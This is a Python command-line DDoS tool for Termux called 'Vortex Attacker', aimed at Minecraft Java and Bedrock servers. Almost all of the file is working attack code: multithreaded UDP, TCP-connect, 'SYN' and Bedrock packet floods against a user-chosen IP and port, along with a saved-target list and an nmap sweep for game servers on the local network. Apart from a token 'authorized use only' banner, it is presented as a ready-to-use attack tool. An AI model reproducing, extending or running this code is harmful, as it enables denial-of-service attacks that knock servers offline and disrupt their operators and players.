#!/usr/bin/env python3
# VORTEX ATTACKER v2.0 - Termux Native Panel
# Minecraft DDoS Tool - No browser needed, runs directly in Termux

import socket
import threading
import random
import sys
import time
import os

VERSION = "2.0"
AUTHOR = "Vortex"

# Colors for Termux
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print(BOLD + CYAN + """
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║    ██╗   ██╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗  ║
║    ██║   ██║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝  ║
║    ██║   ██║██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝   ║
║    ╚██╗ ██╔╝██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗   ║
║     ╚████╔╝ ╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗  ║
║      ╚═══╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  ║
║                                                          ║
║            MINECRAFT DDoS TOOL v2.0                      ║
║            Non-Root | Termux Native                      ║
╚══════════════════════════════════════════════════════════╝
""" + RESET)
    print(YELLOW + "[!] Authorized Use Only - Test on your own servers" + RESET)
    print(BLUE + "[!] Press Ctrl+C to stop any attack" + RESET)

def resolve_domain(domain):
    try:
        ip = socket.gethostbyname(domain)
        print(GREEN + f"[+] {domain} resolved to {ip}" + RESET)
        return ip
    except:
        print(RED + f"[-] Cannot resolve {domain}" + RESET)
        return None

def check_server(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

# Attack methods
def udp_flood(ip, port, stop_event, packet_size=1024):
    data = random._urandom(packet_size)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while not stop_event.is_set():
        try:
            sock.sendto(data, (ip, port))
            sent += 1
            if sent % 10000 == 0:
                print(f"[UDP] Packets sent: {sent}", end="\r")
        except:
            pass

def tcp_flood(ip, port, stop_event):
    sent = 0
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((ip, port))
            sock.send(b"\x00" * 32)
            sock.close()
            sent += 1
            if sent % 1000 == 0:
                print(f"[TCP] Connections: {sent}", end="\r")
        except:
            pass

def syn_flood(ip, port, stop_event):
    sent = 0
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.05)
            sock.connect((ip, port))
            sent += 1
            if sent % 1000 == 0:
                print(f"[SYN] Handshakes: {sent}", end="\r")
        except:
            pass

def bedrock_flood(ip, port, stop_event):
    packet = b'\x01\x00\x00\x00' + b'\x00' * 32 + b'\x00\x00\x00\x00'
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while not stop_event.is_set():
        try:
            sock.sendto(packet, (ip, port))
            sent += 1
            if sent % 5000 == 0:
                print(f"[BEDROCK] Packets: {sent}", end="\r")
        except:
            pass

def start_attack():
    clear_screen()
    banner()
    
    print(PURPLE + "\n[ TARGET SETUP ]" + RESET)
    
    # Get target
    target = input(YELLOW + "Enter IP or Domain (example: 192.168.1.100 or play.server.com): " + RESET)
    
    # Resolve domain
    if not target.replace('.', '').isdigit():
        ip = resolve_domain(target)
        if not ip:
            input("Press Enter to continue...")
            return
    else:
        ip = target
    
    # Port selection
    print(BLUE + "\n[ PORT SELECTION ]" + RESET)
    print("1. Minecraft Java (25565)")
    print("2. Minecraft Bedrock (19132)")
    print("3. Custom Port")
    port_choice = input("Select (1-3): ")
    
    if port_choice == "1":
        port = 25565
    elif port_choice == "2":
        port = 19132
    else:
        port = int(input("Enter custom port: "))
    
    # Check if server online
    print(f"\n[+] Checking {ip}:{port}...")
    if check_server(ip, port):
        print(GREEN + f"[+] Server is ONLINE" + RESET)
    else:
        print(RED + f"[-] Server is OFFLINE or unreachable" + RESET)
        proceed = input("Continue anyway? (y/n): ")
        if proceed.lower() != 'y':
            return
    
    # Attack type
    print(BLUE + "\n[ ATTACK METHOD ]" + RESET)
    print("1. TCP Flood (Java servers - port 25565)")
    print("2. UDP Flood (Generic - good for all)")
    print("3. SYN Flood (Router/Network heavy)")
    print("4. Bedrock Flood (Minecraft PE servers)")
    attack_choice = input("Select (1-4): ")
    
    methods = {"1": tcp_flood, "2": udp_flood, "3": syn_flood, "4": bedrock_flood}
    attack_func = methods.get(attack_choice, tcp_flood)
    method_name = {1:"TCP",2:"UDP",3:"SYN",4:"BEDROCK"}.get(int(attack_choice),"TCP")
    
    # Threads and duration
    threads = int(input(YELLOW + "\nThreads (1000-30000, default 5000): " + RESET) or 5000)
    duration = int(input(YELLOW + "Duration in seconds (default 60): " + RESET) or 60)
    
    # Confirm
    print(RED + "\n" + "="*50)
    print(f"TARGET: {ip}:{port}")
    print(f"METHOD: {method_name}")
    print(f"THREADS: {threads}")
    print(f"DURATION: {duration} seconds")
    print("="*50 + RESET)
    
    confirm = input("\nStart attack? (y/n): ")
    if confirm.lower() != 'y':
        return
    
    # Start attack
    print(GREEN + f"\n[!] ATTACK STARTED on {ip}:{port}" + RESET)
    print(YELLOW + "[!] Press Ctrl+C to stop early" + RESET)
    
    stop_event = threading.Event()
    
    for _ in range(threads):
        t = threading.Thread(target=attack_func, args=(ip, port, stop_event))
        t.daemon = True
        t.start()
    
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print(YELLOW + "\n[!] Stopping attack early..." + RESET)
    finally:
        stop_event.set()
        print(GREEN + f"\n[!] Attack finished on {ip}:{port}" + RESET)
        input("Press Enter to continue...")

def show_saved_targets():
    saved_file = "targets.txt"
    if os.path.exists(saved_file):
        print(BLUE + "\n[ SAVED TARGETS ]" + RESET)
        with open(saved_file, 'r') as f:
            targets = f.read().splitlines()
            for i, t in enumerate(targets, 1):
                print(f"{i}. {t}")
        print(YELLOW + "\nSelect target number to attack, or 0 to cancel" + RESET)
        try:
            choice = int(input("Choice: "))
            if choice > 0 and choice <= len(targets):
                return targets[choice-1]
        except:
            pass
    return None

def save_target(ip, port):
    with open("targets.txt", "a") as f:
        f.write(f"{ip}:{port}\n")

def main_menu():
    while True:
        clear_screen()
        banner()
        print(PURPLE + "\n╔══════════════════════════════════════╗")
        print("║            MAIN MENU                     ║")
        print("╠══════════════════════════════════════╣")
        print("║  1. Start Attack                      ║")
        print("║  2. Attack from Saved Targets         ║")
        print("║  3. Resolve Domain to IP              ║")
        print("║  4. Scan Local Network for Servers    ║")
        print("║  5. Save Current Target               ║")
        print("║  6. Exit                              ║")
        print("╚══════════════════════════════════════╝" + RESET)
        
        choice = input(YELLOW + "Select (1-6): " + RESET)
        
        if choice == "1":
            start_attack()
        elif choice == "2":
            target = show_saved_targets()
            if target:
                ip, port = target.split(':')
                print(GREEN + f"Target set: {ip}:{port}" + RESET)
                # Quick attack with saved target
                # (reuse attack logic with pre-filled values)
        elif choice == "3":
            domain = input("Enter domain: ")
            resolve_domain(domain)
            input("Press Enter...")
        elif choice == "4":
            print(YELLOW + "Scanning local network (192.168.1.0/24)..." + RESET)
            os.system("nmap -p 25565,19132 --open 192.168.1.0/24 -oG - | grep /open | cut -d' ' -f2")
            input("Press Enter...")
        elif choice == "5":
            ip = input("Enter IP to save: ")
            port = input("Enter port: ")
            save_target(ip, port)
            print(GREEN + "Target saved!" + RESET)
            input("Press Enter...")
        elif choice == "6":
            print(RED + "Exiting Vortex Attacker..." + RESET)
            sys.exit(0)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(RED + "\nExiting..." + RESET)
        sys.exit(0)
